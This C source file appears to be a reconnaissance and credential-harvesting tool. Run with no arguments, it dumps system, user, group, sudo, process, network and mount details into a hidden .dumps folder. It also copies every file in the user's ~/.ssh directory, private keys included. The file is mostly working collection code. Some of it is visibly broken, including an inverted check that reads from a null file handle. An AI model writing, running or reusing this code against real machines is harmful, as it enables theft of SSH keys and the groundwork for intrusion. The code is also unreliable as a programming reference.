#include "0x_includes/glob.h"

void basic_system_info(void) {
    ensure_dump_folder();
    struct utsname sys;
    uname(&sys);

    FILE *f = fopen(".dumps/system.txt", "w");
    if (!f) return;
    fprintf(f, "{\n  \"Sysname\": \"%s\",\n  \"Node\": \"%s\",\n  \"Release\": \"%s\",\n  \"Version\": \"%s\",\n  \"Machine\": \"%s\"\n}\n",
            sys.sysname, sys.nodename, sys.release, sys.version, sys.machine);
    fclose(f);
}

void users_groups_info(void) {
    ensure_dump_folder();
    FILE *f = fopen(".dumps/users_groups.txt", "w");
    if (!f) return;

#ifdef __linux__
    struct passwd *pw;
    setpwent();
    fprintf(f, "{\n  \"Users\": [\n");
    int first = 1;
    while ((pw = getpwent())) {
        if (!first) fprintf(f, ",\n");
        fprintf(f, "    {\"name\": \"%s\", \"uid\": %d, \"gid\": %d}", pw->pw_name, pw->pw_uid, pw->pw_gid);
        first = 0;
    }
    fprintf(f, "\n  ],\n");

    struct group *gr;
    setgrent();
    fprintf(f, "  \"Groups\": [\n");
    first = 1;
    while ((gr = getgrent())) {
        if (!first) fprintf(f, ",\n");
        fprintf(f, "    {\"name\": \"%s\", \"gid\": %d, \"members\": [", gr->gr_name, gr->gr_gid);
        for (char **m = gr->gr_mem; *m; m++)
            fprintf(f, "\"%s\"%s", *m, *(m+1)?", ":"");
        fprintf(f, "]}");
        first = 0;
    }
    fprintf(f, "\n  ]\n}\n");

    endpwent();
    endgrent();

    FILE *gsudo = fopen("/etc/group", "r");
    if (gsudo) {
        append_to_file(".dumps/users_groups.txt", "\nSudo group members:\n");
        char line[256];
        while (fgets(line, sizeof(line), gsudo)) {
            if (strncmp(line, "sudo:", 5) == 0) {
                append_to_file(".dumps/users_groups.txt", line);
                break;
            }
        }
        fclose(gsudo);
    }
#elif __APPLE__
    DIR *dir = opendir("/Users");
    struct dirent *entry;
    fprintf(f, "{\n  \"Users\": [\n");
    int first = 1;
    while (dir && (entry = readdir(dir))) {
        if (entry->d_name[0] == '.') continue;
        if (!first) fprintf(f, ",\n");
        fprintf(f, "    \"%s\"", entry->d_name);
        first = 0;
    }
    fprintf(f, "\n  ]\n}\n");
    if (dir) closedir(dir);
#endif
    fclose(f);
}

void cpu_info(void) {
    ensure_dump_folder();
    FILE *f = fopen(".dumps/cpu.txt", "w");
    if (!f) return;

#ifdef __APPLE__
    int cores;
    size_t len = sizeof(cores);
    sysctlbyname("hw.ncpu", &cores, &len, NULL, 0);
    char cpu_model[256];
    len = sizeof(cpu_model);
    sysctlbyname("machdep.cpu.brand_string", &cpu_model, &len, NULL, 0);
    fprintf(f, "{ \"Cores\": %d, \"Model\": \"%s\" }\n", cores, cpu_model);
#elif __linux__
    FILE *cpu = fopen("/proc/cpuinfo", "r");
    if (cpu) {
        char buf[256];
        fprintf(f, "{\n");
        while (fgets(buf, sizeof(buf), cpu)) fprintf(f, "  %s", buf);
        fprintf(f, "}\n");
        fclose(cpu);
    }
#endif
    fclose(f);
}

void memory_info(void) {
    ensure_dump_folder();
    FILE *f = fopen(".dumps/mem.txt", "w");
    if (!f) return;

#ifdef __APPLE__
    uint64_t mem;
    size_t len = sizeof(mem);
    sysctlbyname("hw.memsize", &mem, &len, NULL, 0);
    fprintf(f, "{ \"RAM_GB\": %.2f }\n", (double)mem / (1024*1024*1024));
#elif __linux__
    FILE *meminfo = fopen("/proc/meminfo", "r");
    if (meminfo) {
        char buf[256];
        fprintf(f, "{\n");
        while (fgets(buf, sizeof(buf), meminfo) && strncmp(buf, "MemTotal", 8) != 0) continue;
        fprintf(f, "  %s", buf);
        fclose(meminfo);
        fprintf(f, "}\n");
    }
#endif
    fclose(f);
}

void list_processes(void) {
    ensure_dump_folder();
#ifdef __APPLE__
    system("ps -eo pid,comm > .dumps/processes.txt");
#elif __linux__
    FILE *f_out = fopen(".dumps/processes.txt", "w");
    if (!f_out) return;

    DIR *dir = opendir("/proc");
    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (entry->d_type != DT_DIR) continue;
        char *endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;

        char path[256], line[512];
        snprintf(path, sizeof(path), "/proc/%ld/cmdline", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        if (fgets(line, sizeof(line), f)) fprintf(f_out, "[%ld] %s\n", pid, line);
        fclose(f);

        snprintf(path, sizeof(path), "/proc/%ld/environ", pid);
        f = fopen(path, "r");
        if (f) continue;
        if (fgets(line, sizeof(line), f)) fprintf(f_out, "Env: %s\n", line);
        fclose(f);
    }
    closedir(dir);
    fclose(f_out);
#endif
}

void network_info(void) {
    ensure_dump_folder();
    FILE *f = fopen(".dumps/network.txt", "w");
    if (!f) return;

    struct ifaddrs *ifaddr, *ifa;
    char host[NI_MAXHOST];

    if (getifaddrs(&ifaddr) == -1) {
        fclose(f);
        return;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        fprintf(f, "Interface: %s\n", ifa->ifa_name);
        int family = ifa->ifa_addr->sa_family;
        if (family == AF_INET || family == AF_INET6) {
            void *addr_ptr = (family == AF_INET) ?
                (void *)&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr :
                (void *)&((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;
            inet_ntop(family, addr_ptr, host, sizeof(host));
            fprintf(f, "Address: %s\n", host);
        }
        fprintf(f, "Flags: %u\n\n", ifa->ifa_flags);
    }
    freeifaddrs(ifaddr);
    fclose(f);
}

void dump_ssh_keys(void) {
    ensure_dump_folder();
    char *home = getenv("HOME");
    if (!home) return;

    char path[512];
    snprintf(path, sizeof(path), "%s/.ssh", home);
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    FILE *f_out = fopen(".dumps/ssh_keys.txt", "w");
    if (!f_out) { closedir(dir); return; }

    while ((entry = readdir(dir))) {
        if (entry->d_name[0] == '.') continue;
        char keypath[512];
        snprintf(keypath, sizeof(keypath), "%s/%s", path, entry->d_name);
        FILE *f = fopen(keypath, "r");
        if (!f) continue;

        char buf[256];
        fprintf(f_out, "=== %s ===\n", entry->d_name);
        while (fgets(buf, sizeof(buf), f)) fprintf(f_out, "%s", buf);
        fprintf(f_out, "\n");
        fclose(f);
    }
    closedir(dir);
    fclose(f_out);
}

void drives_info(void) {
    ensure_dump_folder();
    FILE *f = fopen(".dumps/drives.txt", "w");
    if (!f) return;

#ifdef __APPLE__
    system("mount > .dumps/drives.txt");
#elif __linux__
    FILE *mounts = fopen("/proc/mounts", "r");
    char buf[256];
    fprintf(f, "{\n");
    while (mounts && fgets(buf, sizeof(buf), mounts)) fprintf(f, "  %s", buf);
    if (mounts) fclose(mounts);
    fprintf(f, "}\n");
#endif
    fclose(f);
}

void get_sauce(void) {
    basic_system_info();
    users_groups_info();
    cpu_info();
    memory_info();
    list_processes();
    network_info();
    drives_info();
    dump_ssh_keys();
}

int main(int argc, char **args) {
    (void)args;
    if (argc == 1) {
        get_sauce();
        return 0;
    }
    errors(ARGS, NULL);
    return 0;
}
